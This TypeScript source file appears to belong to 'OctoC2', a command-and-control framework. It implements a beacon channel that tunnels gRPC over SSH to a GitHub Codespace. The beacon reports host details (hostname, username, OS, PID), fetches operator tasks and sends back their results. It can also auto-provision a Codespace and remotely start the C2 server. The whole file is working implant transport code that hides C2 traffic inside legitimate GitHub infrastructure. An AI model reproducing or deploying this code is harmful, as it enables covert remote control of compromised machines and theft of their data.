/**
 * OctoC2 — GrpcSshTentacle  (Tentacle 4 — Codespaces gRPC-over-SSH)
 *
 * Opens an SSH tunnel to a GitHub Codespace via ssh2, forwards a local port
 * to the gRPC server running inside the Codespace, then exchanges tasks and
 * results via @grpc/grpc-js.
 *
 * Environment variables:
 *   SVC_GRPC_CODESPACE_NAME      — Codespace name (e.g. org-repo-abc123)
 *   SVC_GITHUB_USER              — GitHub username for SSH auth
 *   SVC_GRPC_PORT                — gRPC port inside Codespace (default: 50051)
 *   SVC_GRPC_LOCAL_PORT          — Local port for SSH tunnel (default: 50051)
 *   SVC_GRPC_DIRECT              — Skip SSH; connect gRPC directly to this address
 *   SVC_AUTO_PROVISION_CODESPACE — Set to "true" to auto-create/start a Codespace
 *                                  when SVC_GRPC_CODESPACE_NAME is not set.
 *   SVC_GRPC_SERVER_CMD          — Shell command run inside the Codespace to start
 *                                  the gRPC server. Defaults to nohup-launching the
 *                                  OctoC2 server from /workspaces/OctoC2/server.
 *   SVC_CODESPACE_WAIT_MS        — Max ms to wait for Codespace Available (default 120 000)
 *
 * When GRPC_DIRECT is set, SshTunnel is never created — used for unit tests.
 */

import type { CheckinPayload, Task, TaskResult, BeaconConfig } from "../types.ts";
import { BaseTentacle }          from "./BaseTentacle.ts";
import { createLogger }          from "../logger.ts";
import { SshTunnel }             from "./grpc/SshTunnel.ts";
import { BeaconGrpcClient }      from "./grpc/BeaconGrpcClient.ts";
import { CodespaceProvisioner }  from "./grpc/CodespaceProvisioner.ts";

const log = createLogger("GrpcSshTentacle");

// GitHub Codespace SSH gateway listens on port 443 (not 22).
// Port 22 is only reachable from within GitHub's own infrastructure.
// Override via SVC_GRPC_SSH_PORT if targeting a non-Codespace SSH host.
const CODESPACE_SSH_PORT    = parseInt(process.env["SVC_GRPC_SSH_PORT"] ?? "443", 10);
const CODESPACE_HOST_SUFFIX = ".github.dev";

export class GrpcSshTentacle extends BaseTentacle {
  readonly kind = "codespaces" as const;

  private tunnel:    SshTunnel | null        = null;
  private client:    BeaconGrpcClient | null = null;
  private connected  = false;

  // Heartbeat prefix tracking
  private readonly epoch = Math.floor(Date.now() / 1000);
  private seq = 0;
  private tag(): string { return `[job:${this.epoch}:grpc:${++this.seq}]`; }

  // ── isAvailable ──────────────────────────────────────────────────────────────

  override async isAvailable(): Promise<boolean> {
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const direct = process.env.SVC_GRPC_DIRECT;
    if (direct) return true;

    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const codespace = process.env.SVC_GRPC_CODESPACE_NAME;
    const user      = process.env.SVC_GITHUB_USER;
    const autoProvision = Boolean(
      process.env["SVC_AUTO_PROVISION_CODESPACE"] === "true" ||
      process.env["SVC_AUTO_PROVISION_CODESPACE"] === "1"
    );

    if (!codespace || !user) {
      if (!autoProvision) {
        log.debug("isAvailable() → false (codespace name or github user not set; auto-provision disabled)");
        return false;
      }
      // Auto-provision path — provisioning happens inside ensureConnected()
      log.info("[bootstrap] no Codespace configured — auto-provision enabled, will provision on connect");
    }

    try {
      // Use a generous timeout since provisioning a new Codespace can take 2+ minutes
      const timeoutMs = autoProvision && (!codespace || !user)
        ? parseInt(process.env["SVC_CODESPACE_WAIT_MS"] ?? "150000", 10)
        : 10_000;

      await Promise.race([
        this.ensureConnected(),
        new Promise<never>((_, reject) =>
          setTimeout(() => reject(new Error("connection timeout")), timeoutMs)
        ),
      ]);
      return true;
    } catch (err) {
      log.debug(`isAvailable() → false: ${(err as Error).message}`);
      return false;
    }
  }

  // ── checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    await this.ensureConnected();

    const resp = await this.client!.checkin({
      beaconId:  payload.beaconId,
      publicKey: payload.publicKey,
      hostname:  payload.hostname,
      username:  payload.username,
      os:        payload.os,
      arch:      payload.arch,
      pid:       payload.pid,
      checkinAt: payload.checkinAt,
    });

    const tasks: Task[] = (resp.pendingTasks ?? []).map((t) => ({
      taskId:   t.id,
      kind:     t.kind as Task["kind"],
      args:     (() => { try { return JSON.parse(t.argsJson ?? "{}") as Record<string, unknown>; } catch { return {}; } })(),
      issuedAt: t.issuedAt || undefined,
    }));

    log.info(`${this.tag()} checkin → ${tasks.length} task(s)`);
    return tasks;
  }

  // ── submitResult ─────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<void> {
    await this.ensureConnected();

    await this.client!.submitResult({
      result: {
        taskId:      result.taskId,
        beaconId:    result.beaconId,
        success:     result.success,
        output:      result.output,
        data:        result.data        ?? "",
        completedAt: result.completedAt,
        signature:   result.signature   ?? "",
      },
    });

    log.info(`${this.tag()} result submitted task ${result.taskId}`);
  }

  // ── teardown ─────────────────────────────────────────────────────────────────

  override async teardown(): Promise<void> {
    this.connected = false;
    try { this.client?.close(); }         catch {}
    try { await this.tunnel?.close(); }   catch {}
    this.client = null;
    this.tunnel = null;
    log.debug("teardown() complete");
  }

  // ── ensureConnected (private) ─────────────────────────────────────────────────

  private async ensureConnected(): Promise<void> {
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const direct = process.env.SVC_GRPC_DIRECT;

    // ── Direct mode (no SSH) — for pre-forwarded local addresses only ────────
    //
    // WARNING: Do NOT point SVC_GRPC_DIRECT at a Dev Tunnels URL
    // (*.app.github.dev). Dev Tunnels proxies external HTTP/2 to the backend
    // as HTTP/1.1. gRPC requires end-to-end H2C — the proxy breaks it with a
    // 502. Use the SSH tunnel path instead (SVC_GRPC_CODESPACE_NAME), or use
    // HttpTentacle (SVC_HTTP_URL) as the fallback channel via port 8080.
    if (direct) {
      const isDevTunnels = /\.app\.github\.dev(:\d+)?$/.test(direct);
      if (isDevTunnels) {
        log.warn(
          `[grpc] SVC_GRPC_DIRECT points to a Dev Tunnels URL (${direct}). ` +
          `Dev Tunnels downgrades H2→H1 for backend connections — gRPC will fail with 502. ` +
          `Use SSH tunnel mode (SVC_GRPC_CODESPACE_NAME) or HttpTentacle (SVC_HTTP_URL) instead.`
        );
      }
      if (!this.connected || !this.client) {
        this.client    = new BeaconGrpcClient();
        await this.client.connect(direct);
        this.connected = true;
        log.debug(`Connected (direct) → ${direct}`);
      }
      return;
    }

    // ── SSH tunnel mode ───────────────────────────────────────────────────────
    if (this.connected && this.tunnel?.isAlive()) return;

    // ── Auto-provision Codespace if not configured ────────────────────────────
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    if (!process.env.SVC_GRPC_CODESPACE_NAME || !process.env.SVC_GITHUB_USER) {
      const autoProvision = Boolean(
        process.env["SVC_AUTO_PROVISION_CODESPACE"] === "true" ||
        process.env["SVC_AUTO_PROVISION_CODESPACE"] === "1"
      );
      if (!autoProvision) {
        throw new Error("Codespace name or GitHub user not set and auto-provision is disabled");
      }

      const provisioner = new CodespaceProvisioner(
        this.config.token,
        this.config.repo.owner,
        this.config.repo.name,
      );
      const { name, user } = await provisioner.ensureRunning();

      // Inject into process.env so all subsequent tunnel attempts use the provisioned Codespace.
      // Bracket notation for writes — you cannot assign to a replaced literal.
      process.env["SVC_GRPC_CODESPACE_NAME"] = name;
      if (!process.env["SVC_GITHUB_USER"]) process.env["SVC_GITHUB_USER"] = user;
    }

    const codespace = (process.env.SVC_GRPC_CODESPACE_NAME ?? process.env["SVC_GRPC_CODESPACE_NAME"])!;
    const user      = (process.env.SVC_GITHUB_USER ?? process.env["SVC_GITHUB_USER"])!;
    const grpcPort  = parseInt(process.env["SVC_GRPC_PORT"]       ?? "50051", 10);
    const localPort = parseInt(process.env["SVC_GRPC_LOCAL_PORT"] ?? "50051", 10);
    const host      = `${codespace}${CODESPACE_HOST_SUFFIX}`;

    let lastErr: Error | null = null;

    for (let attempt = 0; attempt < 2; attempt++) {
      if (attempt > 0) {
        await new Promise((r) => setTimeout(r, 2000));
      }
      try {
        try { this.client?.close(); }      catch {}
        try { await this.tunnel?.close(); } catch {}

        this.tunnel = new SshTunnel();
        this.client = new BeaconGrpcClient();

        await this.tunnel.connect(host, CODESPACE_SSH_PORT, user, this.config.token);
        log.info(`${this.tag()} SSH connection established → ${host}`);

        // ── Start gRPC server in Codespace if configured ─────────────────────
        await this.ensureGrpcServerRunning();

        await this.tunnel.forward(localPort, grpcPort);
        await this.client.connect(`localhost:${localPort}`);

        this.connected = true;
        log.info(`${this.tag()} SSH tunnel established → ${host}:${grpcPort}`);
        return;
      } catch (err) {
        lastErr = err as Error;
        log.warn(`${this.tag()} connection attempt ${attempt + 1}/2 failed: ${lastErr.message}`);
      }
    }

    throw lastErr ?? new Error("Failed to establish gRPC-over-SSH connection");
  }

  /**
   * Run the gRPC server startup command inside the Codespace (if configured).
   * Uses SVC_GRPC_SERVER_CMD, falling back to a reasonable default for the
   * standard OctoC2 Codespace layout. Fire-and-forget — does not wait for the
   * server to be fully up (gRPC connect below will retry).
   */
  private async ensureGrpcServerRunning(): Promise<void> {
    const serverCmd = process.env["SVC_GRPC_SERVER_CMD"] ??
      "pgrep -f 'server/src/index.ts' > /dev/null 2>&1 || " +
      "nohup bun /workspaces/OctoC2/server/src/index.ts >/tmp/svc-grpc.log 2>&1 &";

    if (!this.tunnel) return;

    try {
      log.info(`[bootstrap] starting gRPC server in Codespace: ${serverCmd}`);
      await this.tunnel.exec(serverCmd);
      // Brief pause to let the server bind its port
      await new Promise((r) => setTimeout(r, 2_000));
    } catch (err) {
      // Non-fatal — maybe the server is already running; gRPC connect will confirm
      log.warn(`[bootstrap] server start command failed (may already be running): ${(err as Error).message}`);
    }
  }
}
